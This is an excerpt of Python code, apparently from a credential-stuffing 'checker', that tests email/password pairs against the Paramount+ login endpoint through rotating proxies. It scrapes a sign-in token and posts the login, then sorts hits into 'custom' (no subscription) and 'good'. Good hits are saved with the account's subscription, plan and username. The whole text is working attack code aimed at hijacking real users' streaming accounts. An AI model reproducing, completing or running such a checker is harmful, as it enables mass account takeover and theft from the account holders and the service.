    ...
    while not Checker.stopping:
        try:
            ...
            with Session() as s:
                ...
                tk = (
                    s.get("https://www.paramountplus.com/account/signin/")
                    .text.split('"tk_trp":"')[1]
                    .split('"')[0]
                )
                ...
                response = s.post(
                    "https://www.paramountplus.com/account/xhr/login/",
                    headers=headers,
                    data=data,
                )
                ...
                if not subscribed:
                    if not Checker.cui:
                        log("custom", ":".join([email, password]), "Paramount")
                    save(
                        "Paramount", "custom", Checker.time, ":".join([email, password])
                    )
                    Checker.custom += 1
                    return_proxy(proxy)
                    return
                ...
                subscription = (
                    data["user"]["svod"]["user_package"]["code"]
                    .replace("_", " ")
                    .lower()
                    .title()
                )
                ...
                if not Checker.cui:
                    log("good", ":".join([email, password]), "Paramount")
                save(
                    "Paramount",
                    "good",
                    Checker.time,
                    ":".join([email, password])
                    + f" | Subscription: {subscription} | Plan {plan} | Username: {username}",
                )
                Checker.good += 1
                return_proxy(proxy)
                return
